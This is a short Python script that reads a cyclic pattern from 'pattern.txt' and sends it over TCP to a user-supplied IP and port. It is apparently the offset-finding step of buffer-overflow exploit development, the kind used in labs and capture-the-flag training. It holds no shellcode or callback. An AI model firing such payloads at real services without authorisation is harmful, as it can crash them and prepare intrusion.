#!/usr/bin/env python3

import socket
import sys


def connect():
	global s
	pattern = open("pattern.txt","r").read(6200) #Opens pattern.txt file and reads the contents of the file up to 6200 bytes
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Creates a socket for TCP connection
	s.connect((sys.argv[1],int(sys.argv[2]))) # Connects to given ip and port by the user
	print(s.recv(1024)) # Prints to the screen the data recieved from the server when established the TCP connection
	s.send(bytes(pattern,'latin-1')) # Sends the payload
	print("%d bytes has been sended to the target \n" % len(pattern))
	s.close()

def main():
	connect()

if __name__ == "__main__":
    main()
